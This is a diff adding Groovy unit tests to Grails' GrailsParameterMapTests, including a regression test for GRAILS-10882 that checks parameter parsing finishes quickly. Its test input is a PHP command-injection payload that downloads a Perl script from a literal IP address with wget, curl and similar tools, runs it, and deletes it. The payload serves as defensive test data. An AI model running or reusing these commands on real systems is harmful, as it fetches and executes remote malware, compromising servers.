@@ -370,4 +370,25 @@ class GrailsParameterMapTests extends GroovyTestCase {
         assert params['prefix']['alpha'] instanceof Map
         assert params['prefix']['alpha'].beta == 'delta'
     }
+
+    // GRAILS-10882
+    void testGRAILS10882() {
+        def request = new MockHttpServletRequest('POST', '/cgi-bin/php.cgi')
+        def phpExploitScannerBody = '<?php system("cd /var/tmp;rm -rf mc.pl*;wget http://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;curl -O http://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;fetch http://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;lwp-get http://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;cd /dev/shm;rm -rf mc.pl*;wget http://164.177.157.215/drupal/themes/bartik/images/log/-log/'
+        request.setParameter(phpExploitScannerBody, '')
+        long startTime = System.currentTimeMillis()
+        def params = new GrailsParameterMap(request)
+        assert params != null
+        assert params.size() > 0
+        assert System.currentTimeMillis() - startTime < 1000L
+    }
+    
+    void testNestedKeys() {
+        def request = new MockHttpServletRequest()
+        def requestParams = ['a.b.c.d': '1', 'a.b.e': '2']
+        request.setParameters(requestParams)
+        def params = new GrailsParameterMap(request)
+        assert '[a.b.c.d:1, a:[b.c.d:1, b:[c.d:1, c:[d:1], e:2], b.e:2], a.b.e:2]' == params.toString()
+        assert params != null
+    }
 }
